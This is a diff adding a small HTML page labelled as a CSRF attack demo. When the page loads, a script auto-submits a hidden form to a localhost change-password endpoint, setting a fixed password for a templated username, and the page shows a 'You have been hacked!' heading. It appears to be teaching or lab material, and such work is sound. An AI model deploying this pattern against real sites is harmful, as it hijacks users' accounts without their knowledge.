@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CSRF Attack Demo</title>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    document.getElementById('csrf-form').submit();
+});
+</script>
+</head>
+<body>
+<h1>You have been hacked!</h1>
+<form id="csrf-form" action="http://localhost:3000/change-password" method="POST" style="display:none;">
+    <input type="text" name="username" value="<%= username %>"/>
+    <input type="text" name="newPassword" value="hackedPassword" />
+    <input type="submit" value="Submit" />
+</form>
+</body>
+</html>
